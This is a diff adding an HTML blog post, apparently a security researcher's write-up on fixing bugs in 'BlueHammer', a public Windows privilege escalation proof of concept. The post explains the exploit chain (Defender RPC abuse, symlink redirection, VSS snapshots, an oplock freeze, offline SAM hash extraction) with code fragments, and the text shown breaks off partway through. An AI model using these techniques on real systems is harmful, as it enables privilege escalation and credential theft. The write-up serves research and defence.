@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BlueHammer: Fixing the Bugs in a Windows Zero-Day LPE PoC | cyb3r-w0lf</title>
+<meta name="description" content="Deep dive into BlueHammer — a Windows LPE that chains WD RPC abuse, VSS, oplocks and SAM offline parsing to reach SYSTEM. Full bug analysis and fixes.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&family=JetBrains+Mono:wght@400;500;600&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+
+:root{
+  --bg:#0b0d11;
+  --surface:#11151d;
+  --surface2:#161c27;
+  --border:rgba(255,255,255,0.07);
+  --border2:rgba(255,255,255,0.13);
+  --accent:#2dd4bf;       /* teal — security/research feel */
+  --accent2:#f97316;      /* orange for warnings/critical */
+  --accent3:#818cf8;      /* indigo for info */
+  --red:#f87171;
+  --green:#4ade80;
+  --text:#e2e8f0;
+  --text2:#94a3b8;
+  --text3:#475569;
+  --mono:'JetBrains Mono',monospace;
+  --body:'DM Sans',system-ui,sans-serif;
+  --display:'Syne',sans-serif;
+}
+
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:16px;line-height:1.8;-webkit-font-smoothing:antialiased;overflow-x:hidden;}
+
+/* reading progress */
+#progress{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--accent);z-index:9000;box-shadow:0 0 8px var(--accent);}
+
+/* scrollbar */
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px;}
+::selection{background:rgba(45,212,191,0.15);color:var(--accent);}
+
+/* back-to-top */
+#back-top{position:fixed;bottom:24px;right:24px;width:38px;height:38px;border-radius:8px;background:var(--surface2);border:1px solid var(--border2);color:var(--accent);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:800;opacity:0;pointer-events:none;transition:opacity .3s,transform .3s;text-decoration:none;font-size:.9rem;}
+#back-top.show{opacity:1;pointer-events:auto;}
+#back-top:hover{background:var(--accent);color:var(--bg);transform:translateY(-3px);}
+
+/* ── HEADER ── */
+.site-header{background:rgba(11,13,17,.92);backdrop-filter:blur(14px);padding:0 48px;height:64px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:800;border-bottom:1px solid var(--border);}
+.logo{font-family:var(--mono);font-size:.9rem;font-weight:600;display:flex;align-items:center;gap:10px;color:var(--text);text-decoration:none;}
+.logo img{width:30px;height:30px;border-radius:50%;border:2px solid var(--accent);}
+.logo-accent{color:var(--accent);}
+.header-nav{display:flex;align-items:center;gap:16px;}
+.nav-btn{font-family:var(--body);font-size:.85rem;color:var(--text2);display:flex;align-items:center;gap:6px;padding:6px 14px;border-radius:6px;border:1px solid transparent;transition:all .2s;text-decoration:none;}
+.nav-btn.primary{background:rgba(45,212,191,.12);border-color:rgba(45,212,191,.3);color:var(--accent);}
+.nav-btn.primary:hover{background:var(--accent);color:var(--bg);}
+.nav-btn:not(.primary):hover{color:var(--text);border-color:var(--border2);}
+
+/* ── HERO ── */
+.hero{max-width:860px;margin:0 auto;padding:72px 24px 56px;}
+.hero-tags{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:28px;}
+.tag{font-family:var(--mono);font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;padding:4px 10px;border-radius:4px;font-weight:500;border:1px solid;}
+.t-red{background:rgba(248,113,113,.1);color:var(--red);border-color:rgba(248,113,113,.25);}
+.t-teal{background:rgba(45,212,191,.1);color:var(--accent);border-color:rgba(45,212,191,.25);}
+.t-orange{background:rgba(249,115,22,.1);color:var(--accent2);border-color:rgba(249,115,22,.25);}
+.t-indigo{background:rgba(129,140,248,.1);color:var(--accent3);border-color:rgba(129,140,248,.25);}
+.t-green{background:rgba(74,222,128,.1);color:var(--green);border-color:rgba(74,222,128,.25);}
+
+.hero h1{font-family:var(--display);font-size:clamp(26px,5vw,48px);font-weight:800;line-height:1.08;letter-spacing:-.03em;color:#fff;margin-bottom:20px;}
+.hero h1 em{font-style:normal;color:var(--accent);}
+.hero-sub{font-size:1.05rem;color:var(--text2);line-height:1.7;max-width:680px;margin-bottom:28px;}
+.meta{display:flex;align-items:center;gap:20px;flex-wrap:wrap;font-family:var(--body);font-size:.85rem;color:var(--text3);border-top:1px solid var(--border);padding-top:18px;}
+.meta a{color:var(--accent);text-decoration:none;}
+
+/* ── BODY ── */
+.body{max-width:860px;margin:0 auto;padding:0 24px 100px;}
+
+/* ── KEY FINDINGS ── */
+.findings-box{background:var(--surface);border:1px solid var(--border2);border-left:3px solid var(--accent);border-radius:0 12px 12px 0;padding:24px 28px;margin:32px 0 44px;}
+.findings-box h3{font-family:var(--display);font-size:1rem;font-weight:700;color:var(--accent);margin-bottom:16px;letter-spacing:.02em;text-transform:uppercase;font-size:.8rem;}
+.findings-box ul{list-style:none;display:flex;flex-direction:column;gap:10px;}
+.findings-box ul li{font-family:var(--body);font-size:.95rem;color:var(--text2);padding-left:20px;position:relative;line-height:1.65;}
+.findings-box ul li::before{content:'▸';position:absolute;left:0;color:var(--accent);font-size:.75rem;top:3px;}
+.findings-box ul li strong{color:var(--text);}
+
+/* ── TOC ── */
+.toc{background:var(--surface);border:1px solid var(--border2);border-radius:10px;padding:22px 26px;margin:0 0 44px;}
+.toc-title{font-family:var(--mono);font-size:.65rem;text-transform:uppercase;letter-spacing:.12em;color:var(--text3);margin-bottom:14px;}
+.toc ol{list-style:none;padding:0;margin:0;counter-reset:toc;}
+.toc li{counter-increment:toc;display:flex;align-items:baseline;gap:10px;padding:4px 0;font-family:var(--body);font-size:.9rem;}
+.toc li::before{content:counter(toc,decimal-leading-zero);font-family:var(--mono);font-size:.65rem;color:var(--text3);flex-shrink:0;}
+.toc a{color:var(--text2);text-decoration:none;}
+.toc a:hover{color:var(--text);}
+
+/* ── HEADINGS ── */
+h2{font-family:var(--display);font-size:1.6rem;font-weight:700;color:#fff;margin:56px 0 18px;letter-spacing:-.02em;display:flex;align-items:center;gap:12px;}
+h2::before{content:'';display:inline-block;width:4px;height:24px;background:var(--accent);border-radius:3px;flex-shrink:0;}
+h3{font-family:var(--display);font-size:1.15rem;font-weight:700;color:var(--text);margin:36px 0 12px;letter-spacing:-.01em;}
+h4{font-family:var(--body);font-size:.9rem;font-weight:600;color:var(--accent);margin:24px 0 8px;font-family:var(--mono);letter-spacing:.05em;text-transform:uppercase;}
+
+/* ── PROSE ── */
+p{font-family:var(--body);font-size:1rem;color:var(--text2);margin-bottom:18px;line-height:1.8;}
+p:last-child{margin-bottom:0;}
+strong{color:var(--text);font-weight:600;}
+em{color:var(--accent2);font-style:italic;}
+a{color:var(--accent);text-decoration:none;border-bottom:1px solid rgba(45,212,191,.25);}
+a:hover{border-color:var(--accent);}
+
+/* ── INLINE CODE ── */
+p code,li code,td code{font-family:var(--mono);font-size:.82rem;background:rgba(255,255,255,.07);padding:2px 7px;border-radius:4px;color:var(--accent);border:1px solid var(--border);}
+
+/* ── CODE BLOCKS ── */
+.code-wrap{position:relative;margin:20px 0 28px;}
+.code-label{position:absolute;top:0;left:0;right:0;height:36px;background:var(--surface2);border-bottom:1px solid var(--border2);border-radius:10px 10px 0 0;display:flex;align-items:center;justify-content:space-between;padding:0 16px;}
+.code-lang{font-family:var(--mono);font-size:.65rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text3);}
+.copy-btn{font-family:var(--mono);font-size:.65rem;letter-spacing:.08em;text-transform:uppercase;color:var(--text3);background:none;border:1px solid var(--border2);border-radius:4px;padding:3px 10px;cursor:pointer;transition:all .2s;}
+.copy-btn:hover{color:var(--accent);border-color:rgba(45,212,191,.3);}
+pre{background:var(--surface);border:1px solid var(--border2);border-radius:10px;padding:52px 22px 22px;overflow-x:auto;}
+code{font-family:var(--mono);font-size:.82rem;line-height:1.75;color:#cbd5e1;}
+
+/* syntax */
+.kw{color:#c4b5fd;} .cl{color:#93c5fd;} .fn{color:#7dd3fc;}
+.st{color:#86efac;} .cm{color:var(--text3);font-style:italic;}
+.an{color:#fdba74;} .nu{color:#fca5a5;} .ty{color:#fde68a;}
+.pp{color:#f0abfc;}
+
+/* ── CALLOUTS ── */
+.callout{border-radius:10px;padding:16px 20px;margin:24px 0;display:flex;gap:14px;align-items:flex-start;border:1px solid;}
+.callout-icon{font-size:15px;flex-shrink:0;margin-top:3px;}
+.callout p{margin:0;font-family:var(--body);font-size:.93rem;line-height:1.65;}
+.c-danger{background:rgba(248,113,113,.07);border-color:rgba(248,113,113,.22);}
+.c-danger p{color:#fca5a5;}
+.c-warn{background:rgba(249,115,22,.07);border-color:rgba(249,115,22,.22);}
+.c-warn p{color:#fdba74;}
+.c-info{background:rgba(45,212,191,.07);border-color:rgba(45,212,191,.2);}
+.c-info p{color:#99f6e4;}
+.c-tip{background:rgba(74,222,128,.07);border-color:rgba(74,222,128,.2);}
+.c-tip p{color:#86efac;}
+
+/* ── BUG CARDS ── */
+.bug-card{background:var(--surface);border:1px solid var(--border2);border-radius:12px;margin:20px 0 32px;overflow:hidden;}
+.bug-header{display:flex;align-items:center;gap:14px;padding:16px 20px;border-bottom:1px solid var(--border);}
+.bug-num{font-family:var(--mono);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;padding:4px 10px;border-radius:20px;border:1px solid;flex-shrink:0;}
+.sev-critical{background:rgba(248,113,113,.12);color:var(--red);border-color:rgba(248,113,113,.3);}
+.sev-minor{background:rgba(249,115,22,.1);color:var(--accent2);border-color:rgba(249,115,22,.25);}
+.sev-build{background:rgba(129,140,248,.1);color:var(--accent3);border-color:rgba(129,140,248,.25);}
+.bug-title{font-family:var(--display);font-size:1rem;font-weight:700;color:var(--text);}
+.bug-file{font-family:var(--mono);font-size:.72rem;color:var(--text3);margin-left:auto;}
+.bug-body{padding:18px 20px;}
+.bug-body p{font-size:.93rem;margin-bottom:12px;}
+
+/* diff view */
+.diff{background:#0d1117;border:1px solid var(--border2);border-radius:8px;overflow:hidden;margin:12px 0;}
+.diff-row{display:grid;grid-template-columns:1fr 1fr;}
+.diff-col{padding:14px 16px;}
+.diff-col:first-child{border-right:1px solid var(--border);}
+.diff-head{font-family:var(--mono);font-size:.65rem;letter-spacing:.08em;text-transform:uppercase;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px;}
+.diff-before .diff-head{background:rgba(248,113,113,.08);color:var(--red);}
+.diff-after  .diff-head{background:rgba(74,222,128,.08);color:var(--green);}
+.diff-before code{color:#fca5a5;}
+.diff-after  code{color:#86efac;}
+.diff pre{background:transparent;border:none;border-radius:0;padding:0;margin:0;}
+
+/* ── CHAIN DIAGRAM ── */
+.chain{background:var(--surface);border:1px solid var(--border2);border-radius:12px;padding:28px 20px;margin:24px 0;overflow-x:auto;}
+.chain-steps{display:flex;align-items:flex-start;min-width:640px;}
+.chain-step{flex:1;text-align:center;position:relative;}
+.chain-step:not(:last-child)::after{content:'→';position:absolute;right:-14px;top:16px;color:var(--text3);font-size:18px;z-index:2;}
+.step-dot{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.8rem;font-weight:600;margin:0 auto 10px;border:1px solid;}
+.dot-teal  {background:rgba(45,212,191,.12);color:var(--accent); border-color:rgba(45,212,191,.3);}
+.dot-orange{background:rgba(249,115,22,.1); color:var(--accent2);border-color:rgba(249,115,22,.3);}
+.dot-red   {background:rgba(248,113,113,.1);color:var(--red);    border-color:rgba(248,113,113,.3);}
+.dot-indigo{background:rgba(129,140,248,.1);color:var(--accent3);border-color:rgba(129,140,248,.3);}
+.dot-green {background:rgba(74,222,128,.1); color:var(--green);  border-color:rgba(74,222,128,.3);}
+.step-label{font-family:var(--body);font-size:.75rem;color:var(--text2);line-height:1.45;padding:0 4px;}
+
+/* ── TABLES ── */
+.table-wrap{overflow-x:auto;margin:20px 0 28px;}
+table{width:100%;border-collapse:collapse;font-family:var(--body);font-size:.9rem;}
+th{font-family:var(--mono);font-size:.65rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text3);text-align:left;padding:10px 14px;border-bottom:1px solid var(--border2);}
+td{padding:11px 14px;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top;line-height:1.55;}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:rgba(255,255,255,.02);}
+
+/* ── BLOCKQUOTE ── */
+blockquote{border-left:3px solid var(--accent);margin:24px 0;padding:14px 20px;background:rgba(45,212,191,.04);border-radius:0 8px 8px 0;}
+blockquote p{font-style:italic;font-size:.97rem;color:var(--text);margin:0;line-height:1.7;}
+blockquote cite{display:block;margin-top:8px;font-size:.75rem;color:var(--text3);font-style:normal;font-family:var(--mono);}
+
+/* ── DIVIDER ── */
+.divider{height:1px;background:var(--border);margin:48px 0;}
+
+/* ── REFS ── */
+.refs{font-size:.82rem;color:var(--text3);line-height:2.2;}
+.refs a{color:var(--text2);border-bottom-color:var(--border2);}
+.refs a:hover{color:var(--accent);}
+
+/* ── FOOTER ── */
+footer{border-top:1px solid var(--border);padding:32px 24px;max-width:860px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px;}
+footer p{font-family:var(--body);font-size:.85rem;color:var(--text3);}
+footer a{color:var(--text2);font-family:var(--body);font-size:.88rem;text-decoration:none;}
+footer a:hover{color:var(--accent);}
+
+/* ── RESPONSIVE ── */
+@media(max-width:640px){
+  .site-header{padding:0 16px;}
+  .header-nav a:not(.primary){display:none;}
+  .hero,.body{padding-left:16px;padding-right:16px;}
+  .hero{padding-top:44px;}
+  .hero h1{font-size:1.7rem;}
+  .diff-row{grid-template-columns:1fr;}
+  .diff-col:first-child{border-right:none;border-bottom:1px solid var(--border);}
+  .chain-steps{min-width:500px;}
+}
+</style>
+</head>
+<body>
+
+<div id="progress"></div>
+<a href="#" id="back-top" aria-label="Back to top"><i class="fa-solid fa-arrow-up"></i></a>
+
+<!-- HEADER -->
+<header class="site-header">
+  <a href="../index.html" class="logo">
+    <img src="https://github.com/cyb3r-w0lf.png" alt="cyb3r-w0lf">
+    <span>~/</span><span class="logo-accent">cyb3r-w0lf</span>
+  </a>
+  <nav class="header-nav">
+    <a href="../index.html" class="nav-btn primary"><i class="fa-solid fa-arrow-left"></i> Portfolio</a>
+    <a href="../index.html#achievements" class="nav-btn">More Posts</a>
+  </nav>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tags">
+    <span class="tag t-red">Zero-Day LPE</span>
+    <span class="tag t-teal">Windows Defender</span>
+    <span class="tag t-orange">VSS Abuse</span>
+    <span class="tag t-indigo">RPC / ALPC</span>
+    <span class="tag t-green">Bug Analysis</span>
+  </div>
+  <h1>BlueHammer:<br><em>Fixing the Bugs</em> in a Windows LPE Zero-Day</h1>
+  <p class="hero-sub">A researcher dropped a fully working local privilege escalation PoC that turns Windows Defender against itself — but shipped it with acknowledged bugs. This is a detailed walkthrough of the exploit chain and every fix required to make it run reliably end-to-end.</p>
+  <div class="meta">
+    <span>⏱ ~20 min read</span>
+    <span>🗓 April 2026</span>
+    <span>✍ <a href="https://github.com/cyb3r-w0lf">cyb3r-w0lf</a></span>
+    <span>🔗 <a href="https://github.com/Nightmare-Eclipse/BlueHammer" target="_blank" rel="noopener">BlueHammer on GitHub</a></span>
+  </div>
+</div>
+
+<!-- BODY -->
+<div class="body">
+
+<!-- KEY FINDINGS -->
+<div class="findings-box">
+  <h3>Key Findings</h3>
+  <ul>
+    <li><strong>BlueHammer</strong> is an unpatched Windows local privilege escalation zero-day published on April 3, 2026 by researcher "Chaotic Eclipse" with no coordinated disclosure, no CVE, and no patch from Microsoft.</li>
+    <li>The exploit requires <strong>no kernel bug, no memory corruption, and no shellcode</strong>. It abuses the interaction between Windows Defender's update workflow, Volume Shadow Copy Service (VSS), the Cloud Files API, and opportunistic locks — all legitimate, documented Windows features.</li>
+    <li>The public PoC (<code>FunnyApp.cpp</code>) contained <strong>six confirmed bugs</strong> — two critical, one build-breaking, and three minor — that prevented reliable execution. All are documented and fixed in this writeup.</li>
+    <li>The most critical bug was a <strong>broken SEEK_END implementation</strong> in the custom FDI cabinet callbacks, which silently corrupted Defender update extraction. The second critical bug caused <strong>LSA boot key decryption to proceed with a zero key</strong> when the data was malformed.</li>
+    <li>The <strong>build-breaking bug</strong> was including the server-side RPC stub (<code>windefend_s.c</code>) in the Visual Studio project — causing duplicate symbol linker errors and blocking compilation entirely.</li>
+    <li>After applying all fixes, the exploit runs <strong>end-to-end on patched Windows 10 and 11</strong>: low-privileged user → NT AUTHORITY\SYSTEM in under a minute.</li>
+  </ul>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <div class="toc-title">Table of Contents</div>
+  <ol>
+    <li><a href="#background">Background — What is BlueHammer?</a></li>
+    <li><a href="#chain">The Exploit Chain — Step by Step</a></li>
+    <li><a href="#rpc">Deep Dive: Windows Defender RPC Abuse</a></li>
+    <li><a href="#vss">Deep Dive: VSS + Cloud Files + Oplock Freeze</a></li>
+    <li><a href="#sam">Deep Dive: SAM Offline Parsing and Hash Decryption</a></li>
+    <li><a href="#bugs">All Six Bugs — Analysis and Fixes</a></li>
+    <li><a href="#build">Building and Running the Fixed PoC</a></li>
+    <li><a href="#detection">Detection and Mitigation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ol>
+</div>
+
+<!-- 1. BACKGROUND -->
+<h2 id="background">Background — What is BlueHammer?</h2>
+
+<p>On April 3, 2026, a researcher operating under the alias "Chaotic Eclipse" published a fully functional Windows local privilege escalation exploit to GitHub. The accompanying message to Microsoft's Security Response Center was blunt: <em>"I was not bluffing Microsoft, and I'm doing it again."</em></p>
+
+<p>The exploit, named <strong>BlueHammer</strong>, had no coordinated disclosure timeline, no CVE assignment, and no patch. Microsoft's only public response was a statement that it "supports coordinated vulnerability disclosure" — notable given how uncoordi nated the disclosure actually was. The researcher later explained the public drop followed MSRC allegedly dismissing the report after demanding a video demonstration that the researcher declined to provide.</p>
+
+<p>The README on the public repository made an important acknowledgement: <em>"There are few bugs in the PoC that could prevent it from working."</em> That was the starting point for this research — read the code, find the bugs, fix them, and understand the exploit chain in full.</p>
+
+<div class="callout c-warn">
+  <span class="callout-icon"><i class="fa-solid fa-triangle-exclamation"></i></span>
+  <p><strong>Scope:</strong> This is a security research writeup on a public, unpatched zero-day. All analysis was conducted in an isolated VM environment. The vulnerability is real, unpatched, and confirmed functional by independent researchers including Will Dormann of Tharros.</p>
+</div>
+
+<p>What makes BlueHammer unusual is its attack surface. This is not a traditional memory corruption exploit. There is no shellcode, no heap spray, no kernel vulnerability being triggered. Instead, the exploit orchestrates four legitimate, documented Windows subsystems into a precise timing chain that was never intended to be combined this way. The architecture itself is the vulnerability.</p>
+
+<!-- 2. CHAIN -->
+<h2 id="chain">The Exploit Chain — Step by Step</h2>
+
+<p>The goal is to reach NT AUTHORITY\SYSTEM from a low-privileged user account. Here is the full chain at a high level:</p>
+
+<div class="chain">
+  <div class="chain-steps">
+    <div class="chain-step">
+      <div class="step-dot dot-teal">01</div>
+      <div class="step-label">Check for pending WD signature update (COM/IUpdateSearcher)</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-teal">02</div>
+      <div class="step-label">Download & extract update CAB from MpSigStub.exe (.rsrc section)</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-orange">03</div>
+      <div class="step-label">Drop EICAR lure + oplock on RstrtMgr.dll to detect WD scan start</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-orange">04</div>
+      <div class="step-label">WD creates VSS snapshot during remediation workflow</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-red">05</div>
+      <div class="step-label">Freeze WD via Cloud Files placeholder + batch oplock</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-red">06</div>
+      <div class="step-label">Object symlink redirects WD update path → attacker dir</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-red">07</div>
+      <div class="step-label">WD RPC call (Proc42) triggers WD to consume spoofed update</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-indigo">08</div>
+      <div class="step-label">Read SAM/SYSTEM/SECURITY hives from VSS snapshot path</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-indigo">09</div>
+      <div class="step-label">Offline parse → boot key → PEK → AES/DES → NTLM hashes</div>
+    </div>
+    <div class="chain-step">
+      <div class="step-dot dot-green">10</div>
+      <div class="step-label">Change admin password → LogonUser → service-based SYSTEM shell</div>
+    </div>
+  </div>
+</div>
+
+<p>Each of these phases has non-trivial implementation behind it. Let's walk through the key technical components before getting to the bugs.</p>
+
+<!-- 3. RPC -->
+<h2 id="rpc">Deep Dive: Windows Defender RPC Abuse</h2>
+
+<h3>The WD RPC Interface</h3>
+
+<p>Windows Defender exposes an internal RPC interface identified by UUID <code>c503f532-443a-4c69-8300-ccd1fbdb3839</code>, version 2.0. The interface is bound over ALPC using the named pipe <code>IMpService77BDAF73-B396-481F-9042-AD358843EC24</code>. The MIDL definition in <code>windefend.idl</code> declares 64+ procedures, but the one BlueHammer cares about is procedure 42:</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">IDL — windefend.idl</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="cm">/* Proc42 — triggers WD to consume an update from a caller-specified path */</span>
+<span class="ty">long</span> <span class="fn">Proc42_ServerMpUpdateEngineSignature</span>(
+    [<span class="kw">in</span>] <span class="ty">long</span>            arg_1,
+    [<span class="kw">in</span>][<span class="kw">string</span>] <span class="ty">wchar_t</span>* arg_2,   <span class="cm">/* path to update directory */</span>
+    [<span class="kw">out</span>] <span class="ty">error_status_t</span>* arg_3);</code></pre>
+</div>
+
+<p>The client-side RPC stub is auto-generated by MIDL into <code>windefend_c.c</code>. The call in <code>wmain</code> binds a handle over RPC, then calls:</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">C++ — FunnyApp.cpp</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="ty">error_status_t</span> errstat;
+<span class="fn">Proc42_ServerMpUpdateEngineSignature</span>(bindhandle, <span class="kw">NULL</span>, args->dirpath, &errstat);
+<span class="cm">/* args->dirpath points to the Object Manager symlink-redirected path */</span></code></pre>
+</div>
+
+<h3>Object Manager Symlink Redirection</h3>
+
+<p>Before the RPC call is made, the exploit uses undocumented NT Object Manager APIs to redirect Defender's expected update directory path through a symlink in the object namespace. This is what lets the exploit supply its own update files — the ones downloaded from Microsoft and extracted from the <code>.rsrc</code> section of <code>MpSigStub.exe</code> — instead of legitimate ones.</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">C++ — object namespace symlink setup</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="cm">/* Create a new object directory to host the symlink */</span>
+<span class="fn">_NtCreateDirectoryObjectEx</span>(&hDir, DIRECTORY_ALL_ACCESS,
+    &objAttrDir, hBaseDir, <span class="nu">0</span>);
+
+<span class="cm">/* Create a symlink pointing WD's expected path to our update directory */</span>
+<span class="fn">_NtCreateSymbolicLinkObject</span>(&hLink, SYMBOLIC_LINK_ALL_ACCESS,
+    &objAttrLink, &targetPath);
+
+<span class="cm">/* After VSS window opens: swap the symlink to the SAM hive path,
+   then use CreateFileTransacted + RollbackTransaction to open it
+   without leaving filesystem artifacts */</span></code></pre>
+</div>
+
+<h3>CAB Extraction from the PE Resource Section</h3>
+
+<p>The legitimate Defender update is fetched from <code>https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64</code> (MpSigStub.exe). The exploit then parses the PE in memory, locates the <code>.rsrc</code> section, extracts an embedded <code>update.cab</code>, and uses the FDI (File Decompression Interface) library to unpack the update files entirely in memory — never touching disk with the raw CAB.</p>
+
+<p>The FDI callbacks (<code>CUST_FNOPEN</code>, <code>CUST_FNSEEK</code>, <code>CUST_FNREAD</code>, <code>CUST_FNWRITE</code>, <code>CUST_FNCLOSE</code>) operate on an in-memory buffer via a custom <code>CabOpArgs</code> struct rather than real file handles. This is where <strong>Bug 1</strong> lived.</p>
+
+<!-- 4. VSS -->
+<h2 id="vss">Deep Dive: VSS + Cloud Files + Oplock Freeze</h2>
+
+<h3>Getting Defender to Create a Shadow Copy</h3>
+
+<p>During certain scan and remediation workflows, Microsoft Defender creates a temporary Volume Shadow Copy (VSS) snapshot. BlueHammer exploits this behavior intentionally. To trigger it, the exploit:</p>
+
+<p>1. Drops a reversed EICAR string to a temp file to bait Defender into scanning. 2. Opens <code>RstrtMgr.dll</code> with <code>FSCTL_REQUEST_BATCH_OPLOCK</code> as a tripwire — when Defender accesses this DLL (which it does during remediation), the oplock break signals that Defender is active and a shadow copy is likely being created. 3. A background thread continuously polls <code>\\Device</code> via <code>NtQueryDirectoryObject</code> watching for new <code>HarddiskVolumeShadowCopyN</code> device entries to appear.</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">C++ — ShadowCopyFinderThread (simplified)</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="cm">/* Continuously poll \Device object directory for new VSS entries */</span>
+<span class="kw">while</span> (running) {
+    <span class="fn">NtQueryDirectoryObject</span>(hDevice, buf, bufLen, <span class="kw">FALSE</span>, <span class="kw">FALSE</span>, &ctx, &retLen);
+    <span class="cm">/* compare against previously recorded HarddiskVolumeShadowCopy* entries */</span>
+    <span class="kw">if</span> (newShadowFound)
+        <span class="fn">SetEvent</span>(hShadowEvent);  <span class="cm">/* signal main thread */</span>
+    <span class="fn">Sleep</span>(<span class="nu">100</span>);
+}</code></pre>
+</div>
+
+<h3>Freezing Defender via Cloud Files API</h3>
+
+<p>Once the shadow copy is confirmed mounted, the exploit needs to hold Defender in a frozen state long enough to read the registry hives from the snapshot. This is done using the Windows Cloud Files (CF) API — the same subsystem that powers OneDrive's on-demand sync placeholders.</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">C++ — FreezeVSS (core logic)</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="cm">/* Register current directory as a Cloud Files sync root */</span>
+<span class="fn">CfRegisterSyncRoot</span>(syncRootPath, &regInfo, <span class="kw">nullptr</span>, CF_REGISTER_FLAG_NONE);
+
+<span class="cm">/* Connect with callback for FETCH_PLACEHOLDERS */</span>
+<span class="fn">CfConnectSyncRoot</span>(syncRootPath, &cbTable, <span class="kw">nullptr</span>, CF_CONNECT_FLAG_NONE, &hConn);
+
+<span class="cm">/* Drop a .lock placeholder file — Defender will try to enumerate it */</span>
+<span class="fn">CfCreatePlaceholders</span>(syncRootPath, &phInfo, <span class="nu">1</span>, CF_CREATE_FLAG_NONE, &processed);
+
+<span class="cm">/* In the FetchPlaceholders callback: when the requesting PID is WinDefend,
+   immediately grab a second batch oplock on the .lock file.
+   The callback never returns — Defender blocks on GetOverlappedResult()
+   waiting for a CF response that never comes. */</span>
+<span class="fn">DeviceIoControl</span>(hLock, FSCTL_REQUEST_BATCH_OPLOCK, <span class="kw">nullptr</span>, <span class="nu">0</span>, ...);
+<span class="fn">GetOverlappedResult</span>(hLock, &ovd, &nwf, <span class="kw">TRUE</span>);  <span class="cm">/* Defender is now frozen here */</span></code></pre>
+</div>
+
+<p>With Defender's scan thread stuck waiting for a Cloud Files response that is intentionally withheld, the VSS snapshot stays mounted and the registry hives remain accessible under a path like:</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">Path — shadow copy hive access</span><button class="copy-btn">copy</button></div>
+  <pre><code>\Device\HarddiskVolumeShadowCopy<span class="nu">12</span>\Windows\System32\Config\SAM
+\Device\HarddiskVolumeShadowCopy<span class="nu">12</span>\Windows\System32\Config\SYSTEM
+\Device\HarddiskVolumeShadowCopy<span class="nu">12</span>\Windows\System32\Config\SECURITY</code></pre>
+</div>
+
+<p>These files are normally locked exclusively by the registry subsystem at runtime. Inside a VSS snapshot they are readable — and because Defender is frozen, there is no cleanup racing against the reads.</p>
+
+<!-- 5. SAM -->
+<h2 id="sam">Deep Dive: SAM Offline Parsing and Hash Decryption</h2>
+
+<h3>Offline Registry via offreg.lib</h3>
+
+<p>The SAM and SYSTEM hives are opened without the Windows registry API using Microsoft's <code>offreg.lib</code> (Offline Registry Library), which avoids the locking semantics of the live registry stack entirely:</p>
+
+<div class="code-wrap">
+  <div class="code-label"><span class="code-lang">C++ — SAM hive access via offreg</span><button class="copy-btn">copy</button></div>
+  <pre><code><span class="ty">ORHKEY</span> hSam, hSys;
+<span class="fn">OROpenHiveByHandle</span>(hSamFile, &hSam);
+<span class="fn">OROpenHiveByHandle</span>(hSysFile, &hSys);
+
+<span class="cm">/* Navigate to SAM\Domains\Account\Users\Names to enumerate accounts */</span>
+<span class="ty">ORHKEY</span> hUsers;
+<span class="fn">OROpenKey</span>(hSam, L<span class="st">"SAM\\Domains\\Account\\Users"</span>, &hUsers);
+<span class="fn">OREnumKey</span>(hUsers, idx, subKeyName, &nameLen, <span class="kw">nullptr</span>, <span class="kw">nullptr</span>, <span class="kw">nullptr</span>);</code></pre>
+</div>
+
+<h3>Boot Key Extraction</h3>
+
